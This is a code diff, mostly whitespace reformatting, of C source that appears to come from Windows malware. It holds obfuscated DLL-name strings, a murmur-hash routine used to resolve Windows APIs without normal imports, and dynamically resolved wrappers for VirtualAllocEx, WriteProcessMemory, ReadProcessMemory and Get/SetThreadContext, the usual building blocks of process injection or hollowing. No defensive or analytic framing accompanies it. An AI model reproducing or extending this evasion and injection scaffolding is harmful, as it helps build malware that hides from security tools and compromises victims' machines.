@@ -11,89 +11,89 @@
 //
 //-----------------------------------------------------------------------------------------
 
-	DWORD murmur_hash(LPCSTR key, UINT length, DWORD seed)
+DWORD murmur_hash(LPCSTR key, UINT length, DWORD seed)
+{
+	// 'm' and 'r' are mixing constants generated offline.
+	// They're not really 'magic', they just happen to work well.
+
+	const unsigned int m = 0x5bd1e995;
+	const int r = 24;
+
+	// Initialize the hash to a 'random' value
+
+	unsigned int h = seed ^ length;
+
+	// Mix 4 bytes at a time into the hash
+
+	const unsigned char * data = (const unsigned char *)key;
+
+	while (length >= 4)
 	{
-		// 'm' and 'r' are mixing constants generated offline.
-		// They're not really 'magic', they just happen to work well.
+		unsigned int k = *(unsigned int *)data;
 
-		const unsigned int m = 0x5bd1e995;
-		const int r = 24;
+		k *= m;
+		k ^= k >> r;
+		k *= m;
 
-		// Initialize the hash to a 'random' value
-
-		unsigned int h = seed ^ length;
-
-		// Mix 4 bytes at a time into the hash
-
-		const unsigned char * data = (const unsigned char *)key;
-
-		while (length >= 4)
-		{
-			unsigned int k = *(unsigned int *)data;
-
-			k *= m;
-			k ^= k >> r;
-			k *= m;
-
-			h *= m;
-			h ^= k;
-
-			data += 4;
-			length -= 4;
-		}
-
-		// Handle the last few bytes of the input array
-
-		switch (length)
-		{
-		case 3: h ^= data[2] << 16;
-		case 2: h ^= data[1] << 8;
-		case 1: h ^= data[0];
-			h *= m;
-		};
-
-		// Do a few final mixes of the hash to ensure the last few
-		// bytes are well-incorporated.
-
-		h ^= h >> 13;
 		h *= m;
-		h ^= h >> 15;
+		h ^= k;
 
-		return h;
+		data += 4;
+		length -= 4;
 	}
-	UINT lenA(LPCSTR input_string)
+
+	// Handle the last few bytes of the input array
+
+	switch (length)
 	{
-		UINT			out_length = 0;
-		PCHAR			ptr;
+	case 3: h ^= data[2] << 16;
+	case 2: h ^= data[1] << 8;
+	case 1: h ^= data[0];
+		h *= m;
+	};
 
-		ptr = (PCHAR)input_string;
-		out_length = 0;
-		while (*ptr != 0) {
-			out_length++;
-			ptr++;
-		}
+	// Do a few final mixes of the hash to ensure the last few
+	// bytes are well-incorporated.
 
-		return out_length;
+	h ^= h >> 13;
+	h *= m;
+	h ^= h >> 15;
+
+	return h;
+}
+UINT lenA(LPCSTR input_string)
+{
+	UINT			out_length = 0;
+	PCHAR			ptr;
+
+	ptr = (PCHAR)input_string;
+	out_length = 0;
+	while (*ptr != 0) {
+		out_length++;
+		ptr++;
 	}
-	BOOL compareA(LPCSTR string1, LPCSTR string2, UINT max_length)
-	{
-		UINT			i;
 
-		//if (str::lenA(string1) != str::lenA(string2)) return 1;
+	return out_length;
+}
+BOOL compareA(LPCSTR string1, LPCSTR string2, UINT max_length)
+{
+	UINT			i;
 
-		for (i = 0; i < max_length; i++) {
-			if (string1[i] != string2[i]) {
-				return 1;
-			}
+	//if (str::lenA(string1) != str::lenA(string2)) return 1;
+
+	for (i = 0; i < max_length; i++) {
+		if (string1[i] != string2[i]) {
+			return 1;
 		}
-
-		return 0;
 	}
+
+	return 0;
+}
 
 //-----------------------------------------------------------------------------------------
 
 static unsigned long	z = 3624360 * (unsigned int)__TIMESTAMP__, w = 5212886 * (unsigned int)__TIMESTAMP__, \
-						jsr = 1234567 * (unsigned int)__TIMESTAMP__, jcong = 3801161 * (unsigned int)__TIMESTAMP__;
+jsr = 1234567 * (unsigned int)__TIMESTAMP__, jcong = 3801161 * (unsigned int)__TIMESTAMP__;
 
 #define KISS  z
 
@@ -115,16 +115,16 @@ static unsigned long	z = 3624360 * (unsigned int)__TIMESTAMP__, w = 5212886 * (u
 
 // Libraries
 
-unsigned char kernel32[]	= "\x23\x23\x0c\x48\x4a\x57\x53\x4a\x51\x10\x17\x13\x49\x51\x51";	// "kernel32.dll"	deobfuscate(kernel32)
-unsigned char shell32[]		= "\x23\x23\x0b\x50\x4d\x4a\x51\x51\x10\x17\x13\x49\x51\x51";		// "shell32.dll"	deobfuscate(shell32)
-unsigned char shlwapi[]		= "\x23\x23\x0b\xb0\x4d\x51\x54\x46\x55\x4e\x13\x49\x51\x51";		// "Shlwapi.dll"	deobfuscate(shlwapi)
-unsigned char ntdll[]		= "\x23\x23\x09\x53\x59\x49\x51\x51\x13\x49\x51\x51";				// "ntdll.dll"		deobfuscate(ntdll)
-unsigned char advapi32[]	= "\x23\x23\x0c\xa6\x49\x5b\x46\x55\x4e\x10\x17\x13\x51\x4e\x47";	// "Advapi32.lib"	deobfuscate(advapi32)
-unsigned char user32[]		= "\x23\x23\x0a\x5a\x50\x4a\x57\x10\x17\x13\x49\x51\x51";			// "user32.dll"		deobfuscate(user32)
-unsigned char wininet[]		= "\x23\x23\x0b\x54\x4e\x53\x4e\x53\x4a\x59\x13\x49\x51\x51";		// "wininet.dll"	deobfuscate(wininet)
-unsigned char msvcrt[]		= "\x23\x23\x0a\x52\x50\x5b\x40\x57\x59\x13\x49\x51\x51";			// "msvcrt.dll"		deobfuscate(msvcrt)
-unsigned char heapalloc[]	= "\x23\x23\x09\xad\x4a\x46\x55\xa6\x51\x51\x4c\x40";				// "HeapAlloc"		deobfuscate(heapalloc)
-unsigned char heaprealloc[]	= "\x23\x23\x0b\xad\x4a\x46\x55\xb7\x4a\xa6\x51\x51\x4c\x40";		// "HeapReAlloc"	deobfuscate(heaprealloc)
+unsigned char kernel32[] = "\x23\x23\x0c\x48\x4a\x57\x53\x4a\x51\x10\x17\x13\x49\x51\x51";	// "kernel32.dll"	deobfuscate(kernel32)
+unsigned char shell32[] = "\x23\x23\x0b\x50\x4d\x4a\x51\x51\x10\x17\x13\x49\x51\x51";		// "shell32.dll"	deobfuscate(shell32)
+unsigned char shlwapi[] = "\x23\x23\x0b\xb0\x4d\x51\x54\x46\x55\x4e\x13\x49\x51\x51";		// "Shlwapi.dll"	deobfuscate(shlwapi)
+unsigned char ntdll[] = "\x23\x23\x09\x53\x59\x49\x51\x51\x13\x49\x51\x51";				// "ntdll.dll"		deobfuscate(ntdll)
+unsigned char advapi32[] = "\x23\x23\x0c\xa6\x49\x5b\x46\x55\x4e\x10\x17\x13\x51\x4e\x47";	// "Advapi32.lib"	deobfuscate(advapi32)
+unsigned char user32[] = "\x23\x23\x0a\x5a\x50\x4a\x57\x10\x17\x13\x49\x51\x51";			// "user32.dll"		deobfuscate(user32)
+unsigned char wininet[] = "\x23\x23\x0b\x54\x4e\x53\x4e\x53\x4a\x59\x13\x49\x51\x51";		// "wininet.dll"	deobfuscate(wininet)
+unsigned char msvcrt[] = "\x23\x23\x0a\x52\x50\x5b\x40\x57\x59\x13\x49\x51\x51";			// "msvcrt.dll"		deobfuscate(msvcrt)
+unsigned char heapalloc[] = "\x23\x23\x09\xad\x4a\x46\x55\xa6\x51\x51\x4c\x40";				// "HeapAlloc"		deobfuscate(heapalloc)
+unsigned char heaprealloc[] = "\x23\x23\x0b\xad\x4a\x46\x55\xb7\x4a\xa6\x51\x51\x4c\x40";		// "HeapReAlloc"	deobfuscate(heaprealloc)
 
 
 
@@ -283,10 +283,10 @@ DWORD WINAPI GetModuleFileName(
   _Out_     LPTSTR lpFilename,
   _In_      DWORD nSize
 );*/
-DWORD (WINAPI *f_GetModuleFileNameA)(__inopt HMODULE module, __out LPSTR file_name, __in UINT size_of_buffer) = NULL;
-DWORD cGetModuleFileNameA(	__inopt		HMODULE		module,
-							__out		LPSTR		file_name,
-							__in		UINT		size_of_buffer)
+DWORD(WINAPI *f_GetModuleFileNameA)(__inopt HMODULE module, __out LPSTR file_name, __in UINT size_of_buffer) = NULL;
+DWORD cGetModuleFileNameA(__inopt		HMODULE		module,
+	__out		LPSTR		file_name,
+	__in		UINT		size_of_buffer)
 {
 	if (f_GetModuleFileNameA == NULL) {
 		f_GetModuleFileNameA = (DWORD(WINAPI *)(HMODULE, LPSTR, UINT))resolve_function(function_hash_chain[0], deobfuscate(kernel32));
@@ -300,11 +300,11 @@ DWORD cGetModuleFileNameA(	__inopt		HMODULE		module,
 VOID WINAPI ExitProcess(
   _In_  UINT uExitCode
 );*/
-VOID (WINAPI *f_ExitProcess)(__in UINT exit_code) = NULL;
+VOID(WINAPI *f_ExitProcess)(__in UINT exit_code) = NULL;
 VOID cExitProcess(__in UINT exit_code)
 {
 	if (f_ExitProcess == NULL) {
-		f_ExitProcess = (VOID (WINAPI *)(UINT))resolve_function(function_hash_chain[1], deobfuscate(kernel32));
+		f_ExitProcess = (VOID(WINAPI *)(UINT))resolve_function(function_hash_chain[1], deobfuscate(kernel32));
 		//CHECK_VALID(f_ExitProcess); <- To prevent infinite recursion FIXME
 	}
 
@@ -319,15 +319,15 @@ HRESULT SHGetFolderPath(
   _In_   DWORD dwFlags,
   _Out_  LPTSTR pszPath
 );*/
-HRESULT (WINAPI *f_SHGetFolderPathA)(__in HWND owner, __in INT folder_type, __in HANDLE token, __in DWORD flags, __out LPSTR path) = NULL;
-HRESULT cSHGetFolderPathA(	__in	HWND		owner,
-							__in    INT			folder_type,
-							__in	HANDLE		token,
-							__in	DWORD		flags,
-							__out	LPSTR		path)
+HRESULT(WINAPI *f_SHGetFolderPathA)(__in HWND owner, __in INT folder_type, __in HANDLE token, __in DWORD flags, __out LPSTR path) = NULL;
+HRESULT cSHGetFolderPathA(__in	HWND		owner,
+	__in    INT			folder_type,
+	__in	HANDLE		token,
+	__in	DWORD		flags,
+	__out	LPSTR		path)
 {
 	if (f_SHGetFolderPathA == NULL) {
-		f_SHGetFolderPathA = (HRESULT (WINAPI *)(HWND, INT, HANDLE, DWORD, LPSTR))resolve_function(function_hash_chain[2], deobfuscate(shell32));
+		f_SHGetFolderPathA = (HRESULT(WINAPI *)(HWND, INT, HANDLE, DWORD, LPSTR))resolve_function(function_hash_chain[2], deobfuscate(shell32));
 		CHECK_VALID(f_SHGetFolderPathA);
 	}
 
@@ -340,13 +340,13 @@ LPTSTR PathCombine(
   _In_opt_  LPCTSTR pszPathIn,
   _In_      LPCTSTR pszMore
 );*/
-LPTSTR (WINAPI *f_PathCombineA)(__out LPSTR path_out, __inopt LPCSTR path_in, __in LPCSTR more) = NULL;
-LPTSTR cPathCombineA(	__out		LPSTR		path_out,
-						__inopt		LPCSTR		path_in,
-						__in		LPCSTR		more)
+LPTSTR(WINAPI *f_PathCombineA)(__out LPSTR path_out, __inopt LPCSTR path_in, __in LPCSTR more) = NULL;
+LPTSTR cPathCombineA(__out		LPSTR		path_out,
+	__inopt		LPCSTR		path_in,
+	__in		LPCSTR		more)
 {
 	if (f_PathCombineA == NULL) {
-		f_PathCombineA = (LPTSTR (WINAPI *)(LPSTR, LPCSTR, LPCSTR))resolve_function(function_hash_chain[3], deobfuscate(shlwapi));
+		f_PathCombineA = (LPTSTR(WINAPI *)(LPSTR, LPCSTR, LPCSTR))resolve_function(function_hash_chain[3], deobfuscate(shlwapi));
 		CHECK_VALID(f_PathCombineA);
 	}
 
@@ -363,18 +363,18 @@ HANDLE WINAPI CreateFile(
   _In_      DWORD dwFlagsAndAttributes,
   _In_opt_  HANDLE hTemplateFile
 );*/
-HANDLE (WINAPI *f_CreateFileA)(__in LPCSTR file_name, __in DWORD access, __in DWORD share, __inopt LPSECURITY_ATTRIBUTES security,
-								__in DWORD creation_disposition, __in DWORD flags, __inopt HANDLE template_file) = NULL;
-HANDLE cCreateFileA(	__in		LPCSTR					file_name,
-						__in		DWORD					access,
-						__in		DWORD					share_mode,
-						__inopt		LPSECURITY_ATTRIBUTES	security,
-						__in		DWORD					creation_disposition,
-						__in		DWORD					flags,
-						__inopt		HANDLE					template_file)
+HANDLE(WINAPI *f_CreateFileA)(__in LPCSTR file_name, __in DWORD access, __in DWORD share, __inopt LPSECURITY_ATTRIBUTES security,
+	__in DWORD creation_disposition, __in DWORD flags, __inopt HANDLE template_file) = NULL;
+HANDLE cCreateFileA(__in		LPCSTR					file_name,
+	__in		DWORD					access,
+	__in		DWORD					share_mode,
+	__inopt		LPSECURITY_ATTRIBUTES	security,
+	__in		DWORD					creation_disposition,
+	__in		DWORD					flags,
+	__inopt		HANDLE					template_file)
 {
 	if (f_CreateFileA == NULL) {
-		f_CreateFileA = (HANDLE (WINAPI *)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+		f_CreateFileA = (HANDLE(WINAPI *)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
 			DWORD, DWORD, HANDLE))resolve_function(function_hash_chain[4], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateFileA);
 	}
@@ -387,12 +387,12 @@ DWORD WINAPI GetFileSize(
   _In_       HANDLE hFile,
   _Out_opt_  LPDWORD lpFileSizeHigh
 );*/
-DWORD (WINAPI *f_GetFileSize)(__in HANDLE file, __outopt LPDWORD file_size_high) = NULL;
-DWORD cGetFileSize(	__in		HANDLE		file,
-					__outopt	LPDWORD		file_size_high)
+DWORD(WINAPI *f_GetFileSize)(__in HANDLE file, __outopt LPDWORD file_size_high) = NULL;
+DWORD cGetFileSize(__in		HANDLE		file,
+	__outopt	LPDWORD		file_size_high)
 {
 	if (f_GetFileSize == NULL) {
-		f_GetFileSize = (DWORD (WINAPI *)(HANDLE, LPDWORD))resolve_function(function_hash_chain[5], deobfuscate(kernel32));
+		f_GetFileSize = (DWORD(WINAPI *)(HANDLE, LPDWORD))resolve_function(function_hash_chain[5], deobfuscate(kernel32));
 		CHECK_VALID(f_GetFileSize);
 	}
 
@@ -405,13 +405,13 @@ LPVOID WINAPI HeapAlloc(
   _In_  DWORD dwFlags,
   _In_  SIZE_T dwBytes
 );*/
-LPVOID (WINAPI *f_HeapAlloc)(__in HANDLE heap, __in DWORD flags, UINT size) = NULL;
-LPVOID cHeapAlloc(	__in		HANDLE		heap,
-					__in		DWORD		flags,
-					__in		UINT		size)
+LPVOID(WINAPI *f_HeapAlloc)(__in HANDLE heap, __in DWORD flags, UINT size) = NULL;
+LPVOID cHeapAlloc(__in		HANDLE		heap,
+	__in		DWORD		flags,
+	__in		UINT		size)
 {
 	if (f_HeapAlloc == NULL) {
-		f_HeapAlloc = (LPVOID (WINAPI *)(HANDLE, DWORD, UINT))resolve_function(function_hash_chain[6], deobfuscate(kernel32));
+		f_HeapAlloc = (LPVOID(WINAPI *)(HANDLE, DWORD, UINT))resolve_function(function_hash_chain[6], deobfuscate(kernel32));
 		CHECK_VALID(f_HeapAlloc);
 	}
 
@@ -419,11 +419,11 @@ LPVOID cHeapAlloc(	__in		HANDLE		heap,
 }
 
 //HANDLE WINAPI GetProcessHeap(void);
-HANDLE (WINAPI *f_GetProcessHeap)(VOID) = NULL;
+HANDLE(WINAPI *f_GetProcessHeap)(VOID) = NULL;
 HANDLE cGetProcessHeap(VOID)
 {
 	if (f_GetProcessHeap == NULL) {
-		f_GetProcessHeap = (LPVOID (WINAPI *)(VOID))resolve_function(function_hash_chain[7], deobfuscate(kernel32));
+		f_GetProcessHeap = (LPVOID(WINAPI *)(VOID))resolve_function(function_hash_chain[7], deobfuscate(kernel32));
 		CHECK_VALID(f_GetProcessHeap);
 	}
 
@@ -438,16 +438,16 @@ BOOL WINAPI ReadFile(
   _Out_opt_    LPDWORD lpNumberOfBytesRead,
   _Inout_opt_  LPOVERLAPPED lpOverlapped
 );*/
-BOOL (WINAPI *f_ReadFile)(__in HANDLE file, __out LPVOID buffer, __in UINT bytes_to_read, __outopt LPUINT bytes_read,
+BOOL(WINAPI *f_ReadFile)(__in HANDLE file, __out LPVOID buffer, __in UINT bytes_to_read, __outopt LPUINT bytes_read,
 	__inoutopt LPOVERLAPPED overlapped) = NULL;
-BOOL cReadFile(	__in		HANDLE		file,
-				__out		LPVOID		buffer,
-				__in		UINT		bytes_to_read,
-				__outopt	LPUINT		bytes_read,
-				__inoutopt  LPOVERLAPPED overlapped)
+BOOL cReadFile(__in		HANDLE		file,
+	__out		LPVOID		buffer,
+	__in		UINT		bytes_to_read,
+	__outopt	LPUINT		bytes_read,
+	__inoutopt  LPOVERLAPPED overlapped)
 {
 	if (f_ReadFile == NULL) {
-		f_ReadFile = (BOOL (WINAPI *)(HANDLE, LPVOID, UINT, LPUINT, LPOVERLAPPED))resolve_function(function_hash_chain[8], deobfuscate(kernel32));
+		f_ReadFile = (BOOL(WINAPI *)(HANDLE, LPVOID, UINT, LPUINT, LPOVERLAPPED))resolve_function(function_hash_chain[8], deobfuscate(kernel32));
 		CHECK_VALID(f_ReadFile);
 	}
 
@@ -458,11 +458,11 @@ BOOL cReadFile(	__in		HANDLE		file,
   _In_  HANDLE hObject
 );*/
 
-BOOL (WINAPI *f_CloseHandle)(__in HANDLE object);
-BOOL cCloseHandle(	__in		HANDLE		object)
+BOOL(WINAPI *f_CloseHandle)(__in HANDLE object);
+BOOL cCloseHandle(__in		HANDLE		object)
 {
 	if (f_CloseHandle == NULL) {
-		f_CloseHandle = (BOOL (WINAPI *)(HANDLE))resolve_function(function_hash_chain[9], deobfuscate(kernel32));
+		f_CloseHandle = (BOOL(WINAPI *)(HANDLE))resolve_function(function_hash_chain[9], deobfuscate(kernel32));
 		CHECK_VALID(f_CloseHandle);
 	}
 
@@ -473,11 +473,11 @@ BOOL cCloseHandle(	__in		HANDLE		object)
 HMODULE WINAPI GetModuleHandle(
   _In_opt_  LPCTSTR lpModuleName
 );*/
-HMODULE (WINAPI *f_GetModuleHandleA)(__in LPCTSTR module_name) = NULL;
+HMODULE(WINAPI *f_GetModuleHandleA)(__in LPCTSTR module_name) = NULL;
 HMODULE cGetModuleHandleA(__in LPCTSTR module_name)
 {
 	if (f_GetModuleHandleA == NULL) {
-		f_GetModuleHandleA = (HMODULE (WINAPI *)(LPCTSTR))resolve_function(function_hash_chain[10], deobfuscate(kernel32));
+		f_GetModuleHandleA = (HMODULE(WINAPI *)(LPCTSTR))resolve_function(function_hash_chain[10], deobfuscate(kernel32));
 		CHECK_VALID(f_GetModuleHandleA);
 	}
 
@@ -497,29 +497,29 @@ BOOL WINAPI CreateProcess(
   _In_         LPSTARTUPINFO lpStartupInfo,
   _Out_        LPPROCESS_INFORMATION lpProcessInformation
 );*/
-BOOL (WINAPI *f_CreateProcessA)(__in_opt			LPCSTR					application_name,
-								__inout_opt		LPSTR					command_line,
-								__in_opt			LPSECURITY_ATTRIBUTES	process_attributes,
-								__in_opt			LPSECURITY_ATTRIBUTES	thread_attributes,
-								__in			BOOL					inherit_handle,
-								__in			DWORD					creation_flags,
-								__in_opt			LPVOID					environment,
-								__in_opt			LPCSTR					current_directory,
-								__in			LPSTARTUPINFOA			startup_info,
-								__out			LPPROCESS_INFORMATION	process_info) = NULL;
-BOOL cCreateProcessA(	__in_opt			LPCSTR					application_name,
-						__inout_opt		LPSTR					command_line,
-						__in_opt			LPSECURITY_ATTRIBUTES	process_attributes,
-						__in_opt			LPSECURITY_ATTRIBUTES	thread_attributes,
-						__in			BOOL					inherit_handle,
-						__in			DWORD					creation_flags,
-						__in_opt			LPVOID					environment,
-						__in_opt			LPCSTR					current_directory,
-						__in			LPSTARTUPINFOA			startup_info,
-						__out			LPPROCESS_INFORMATION	process_info)
+BOOL(WINAPI *f_CreateProcessA)(__in_opt			LPCSTR					application_name,
+	__inout_opt		LPSTR					command_line,
+	__in_opt			LPSECURITY_ATTRIBUTES	process_attributes,
+	__in_opt			LPSECURITY_ATTRIBUTES	thread_attributes,
+	__in			BOOL					inherit_handle,
+	__in			DWORD					creation_flags,
+	__in_opt			LPVOID					environment,
+	__in_opt			LPCSTR					current_directory,
+	__in			LPSTARTUPINFOA			startup_info,
+	__out			LPPROCESS_INFORMATION	process_info) = NULL;
+BOOL cCreateProcessA(__in_opt			LPCSTR					application_name,
+	__inout_opt		LPSTR					command_line,
+	__in_opt			LPSECURITY_ATTRIBUTES	process_attributes,
+	__in_opt			LPSECURITY_ATTRIBUTES	thread_attributes,
+	__in			BOOL					inherit_handle,
+	__in			DWORD					creation_flags,
+	__in_opt			LPVOID					environment,
+	__in_opt			LPCSTR					current_directory,
+	__in			LPSTARTUPINFOA			startup_info,
+	__out			LPPROCESS_INFORMATION	process_info)
 {
 	if (f_CreateProcessA == NULL) {
-		f_CreateProcessA = (BOOL (WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
+		f_CreateProcessA = (BOOL(WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
 			BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))resolve_function(function_hash_chain[11], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateProcessA);
 	}
@@ -534,13 +534,13 @@ BOOL WINAPI HeapFree(
   _In_  DWORD dwFlags,
   _In_  LPVOID lpMem
 );*/
-BOOL (WINAPI *f_HeapFree)(__in HANDLE heap, __in DWORD flags, __in LPVOID memory) = NULL;
-BOOL cHeapFree(	__in		HANDLE		heap,
-				__in		DWORD		flags,
-				__in		LPVOID		memory)
+BOOL(WINAPI *f_HeapFree)(__in HANDLE heap, __in DWORD flags, __in LPVOID memory) = NULL;
+BOOL cHeapFree(__in		HANDLE		heap,
+	__in		DWORD		flags,
+	__in		LPVOID		memory)
 {
 	if (f_HeapFree == NULL) {
-		f_HeapFree = (BOOL (WINAPI *)(HANDLE, DWORD, LPVOID))resolve_function(function_hash_chain[12], deobfuscate(kernel32));
+		f_HeapFree = (BOOL(WINAPI *)(HANDLE, DWORD, LPVOID))resolve_function(function_hash_chain[12], deobfuscate(kernel32));
 		CHECK_VALID(f_HeapFree);
 	}
 
@@ -554,14 +554,14 @@ LPVOID WINAPI HeapReAlloc(
   _In_  LPVOID lpMem,
   _In_  SIZE_T dwBytes
 );*/
-LPVOID (WINAPI *f_HeapReAlloc)(__in HANDLE heap, __in DWORD flags, __in LPVOID memory, __in UINT bytes) = NULL;
-LPVOID cHeapReAlloc(	__in		HANDLE		heap,
-						__in		DWORD		flags,
-						__in		LPVOID		memory,
-						__in		UINT		bytes)
+LPVOID(WINAPI *f_HeapReAlloc)(__in HANDLE heap, __in DWORD flags, __in LPVOID memory, __in UINT bytes) = NULL;
+LPVOID cHeapReAlloc(__in		HANDLE		heap,
+	__in		DWORD		flags,
+	__in		LPVOID		memory,
+	__in		UINT		bytes)
 {
 	if (f_HeapReAlloc == NULL) {
-		f_HeapReAlloc = (LPVOID (WINAPI *)(HANDLE, DWORD, LPVOID, UINT))resolve_function(function_hash_chain[13], deobfuscate(kernel32));
+		f_HeapReAlloc = (LPVOID(WINAPI *)(HANDLE, DWORD, LPVOID, UINT))resolve_function(function_hash_chain[13], deobfuscate(kernel32));
 		CHECK_VALID(f_HeapReAlloc);
 	}
 
@@ -575,14 +575,14 @@ LPVOID WINAPI VirtualAlloc(
   _In_      DWORD flAllocationType,
   _In_      DWORD flProtect
 );*/
-LPVOID (WINAPI *f_VirtualAlloc)(__inopt LPVOID address, __in SIZE_T size, __in DWORD alloc_type, __in DWORD page_security) = NULL;
-LPVOID cVirtualAlloc(	__inopt		LPVOID		address,
-						__in		SIZE_T		size,
-						__in		DWORD		alloc_type,
-						__in		DWORD		page_security)
+LPVOID(WINAPI *f_VirtualAlloc)(__inopt LPVOID address, __in SIZE_T size, __in DWORD alloc_type, __in DWORD page_security) = NULL;
+LPVOID cVirtualAlloc(__inopt		LPVOID		address,
+	__in		SIZE_T		size,
+	__in		DWORD		alloc_type,
+	__in		DWORD		page_security)
 {
 	if (f_VirtualAlloc == NULL) {
-		f_VirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))resolve_function(function_hash_chain[14], deobfuscate(kernel32));
+		f_VirtualAlloc = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))resolve_function(function_hash_chain[14], deobfuscate(kernel32));
 		CHECK_VALID(f_VirtualAlloc);
 	}
 
@@ -597,19 +597,19 @@ LPVOID WINAPI VirtualAllocEx(
   _In_      DWORD flAllocationType,
   _In_      DWORD flProtect
 );*/
-LPVOID (WINAPI *f_VirtualAllocEx)(	__in		HANDLE		process,
-									__in_opt	LPVOID		address,
-									__in		UINT		size,
-									__in		DWORD		alloc_type,
-									__in		DWORD		page_security) = NULL;
-LPVOID cVirtualAllocEx(	__in		HANDLE		process,
-						__in_opt	LPVOID		address,
-						__in		UINT		size,
-						__in		DWORD		alloc_type,
-						__in		DWORD		page_security)
+LPVOID(WINAPI *f_VirtualAllocEx)(__in		HANDLE		process,
+	__in_opt	LPVOID		address,
+	__in		UINT		size,
+	__in		DWORD		alloc_type,
+	__in		DWORD		page_security) = NULL;
+LPVOID cVirtualAllocEx(__in		HANDLE		process,
+	__in_opt	LPVOID		address,
+	__in		UINT		size,
+	__in		DWORD		alloc_type,
+	__in		DWORD		page_security)
 {
 	if (f_VirtualAllocEx == NULL) {
-		f_VirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, UINT, DWORD, DWORD))resolve_function(function_hash_chain[15], deobfuscate(kernel32));
+		f_VirtualAllocEx = (LPVOID(WINAPI *)(HANDLE, LPVOID, UINT, DWORD, DWORD))resolve_function(function_hash_chain[15], deobfuscate(kernel32));
 		CHECK_VALID(f_VirtualAllocEx);
 	}
 
@@ -624,19 +624,19 @@ BOOL WINAPI WriteProcessMemory(
   _In_   SIZE_T nSize,
   _Out_  SIZE_T *lpNumberOfBytesWritten
 );*/
-BOOL (WINAPI *f_WriteProcessMemory)(__in		HANDLE		process,
-									__in		LPVOID		base,
-									__in		LPCVOID		buffer,
-									__in		UINT		size,
-									__out		PUINT		written) = NULL;
-BOOL cWriteProcessMemory(	__in		HANDLE		process,
-							__in		LPVOID		base,
-							__in		LPCVOID		buffer,
-							__in		UINT		size,
-							__out		PUINT		written)
+BOOL(WINAPI *f_WriteProcessMemory)(__in		HANDLE		process,
+	__in		LPVOID		base,
+	__in		LPCVOID		buffer,
+	__in		UINT		size,
+	__out		PUINT		written) = NULL;
+BOOL cWriteProcessMemory(__in		HANDLE		process,
+	__in		LPVOID		base,
+	__in		LPCVOID		buffer,
+	__in		UINT		size,
+	__out		PUINT		written)
 {
 	if (f_WriteProcessMemory == NULL) {
-		f_WriteProcessMemory = (BOOL (WINAPI *)(HANDLE, LPVOID, LPCVOID, UINT, PUINT))resolve_function(function_hash_chain[16], deobfuscate(kernel32));
+		f_WriteProcessMemory = (BOOL(WINAPI *)(HANDLE, LPVOID, LPCVOID, UINT, PUINT))resolve_function(function_hash_chain[16], deobfuscate(kernel32));
 		CHECK_VALID(f_WriteProcessMemory);
 	}
 
@@ -651,22 +651,22 @@ BOOL WINAPI ReadProcessMemory(
   _In_   SIZE_T nSize,
   _Out_  SIZE_T *lpNumberOfBytesRead
 );*/
-BOOL (WINAPI *f_ReadProcessMemory)(	__in		HANDLE		process,
-									__in		LPCVOID		base,
-									__out		LPVOID		buffer,
-									__in		UINT		size,
-									__out		PUINT		read) = NULL;
-BOOL cReadProcessMemory(	__in		HANDLE		process,
-							__in		LPCVOID		base,
-							__out		LPVOID		buffer,
-							__in		UINT		size,
-							__out		PUINT		read)
+BOOL(WINAPI *f_ReadProcessMemory)(__in		HANDLE		process,
+	__in		LPCVOID		base,
+	__out		LPVOID		buffer,
+	__in		UINT		size,
+	__out		PUINT		read) = NULL;
+BOOL cReadProcessMemory(__in		HANDLE		process,
+	__in		LPCVOID		base,
+	__out		LPVOID		buffer,
+	__in		UINT		size,
+	__out		PUINT		read)
 {
 	if (f_ReadProcessMemory == NULL) {
-		f_ReadProcessMemory = (BOOL (WINAPI *)(HANDLE, LPCVOID, LPVOID, UINT, PUINT))resolve_function(function_hash_chain[17], deobfuscate(kernel32));
+		f_ReadProcessMemory = (BOOL(WINAPI *)(HANDLE, LPCVOID, LPVOID, UINT, PUINT))resolve_function(function_hash_chain[17], deobfuscate(kernel32));
 		CHECK_VALID(f_ReadProcessMemory);
 	}
-	
+
 	return f_ReadProcessMemory(process, base, buffer, size, read);
 }
 
@@ -676,13 +676,13 @@ BOOL WINAPI GetThreadContext(
   _Inout_  LPCONTEXT lpContext
 );
 */
-BOOL (WINAPI *f_GetThreadContext)(	__in		HANDLE		thread,
-									__inout		LPCONTEXT	context) = NULL;
-BOOL cGetThreadContext(	__in		HANDLE		thread,
-						__inout		LPCONTEXT	context)
+BOOL(WINAPI *f_GetThreadContext)(__in		HANDLE		thread,
+	__inout		LPCONTEXT	context) = NULL;
+BOOL cGetThreadContext(__in		HANDLE		thread,
+	__inout		LPCONTEXT	context)
 {
 	if (f_GetThreadContext == NULL) {
-		f_GetThreadContext = (BOOL (WINAPI *)(HANDLE, LPCONTEXT))resolve_function(function_hash_chain[18], deobfuscate(kernel32));
+		f_GetThreadContext = (BOOL(WINAPI *)(HANDLE, LPCONTEXT))resolve_function(function_hash_chain[18], deobfuscate(kernel32));
 		CHECK_VALID(f_GetThreadContext);
 	}
 
@@ -694,12 +694,12 @@ BOOL WINAPI SetThreadContext(
   _In_  HANDLE hThread,
   _In_  const CONTEXT *lpContext
 );*/
-BOOL (WINAPI *f_SetThreadContext)(__in HANDLE thread, __in const PCONTEXT context) = NULL;
-BOOL cSetThreadContext(	__in		HANDLE			thread,
-						__in		const PCONTEXT	context)
+BOOL(WINAPI *f_SetThreadContext)(__in HANDLE thread, __in const PCONTEXT context) = NULL;
+BOOL cSetThreadContext(__in		HANDLE			thread,
+	__in		const PCONTEXT	context)
 {
 	if (f_SetThreadContext == NULL) {
-		f_SetThreadContext = (BOOL (WINAPI *)(HANDLE, const PCONTEXT))resolve_function(function_hash_chain[19], deobfuscate(kernel32));
+		f_SetThreadContext = (BOOL(WINAPI *)(HANDLE, const PCONTEXT))resolve_function(function_hash_chain[19], deobfuscate(kernel32));
 		CHECK_VALID(f_SetThreadContext);
 	}
 
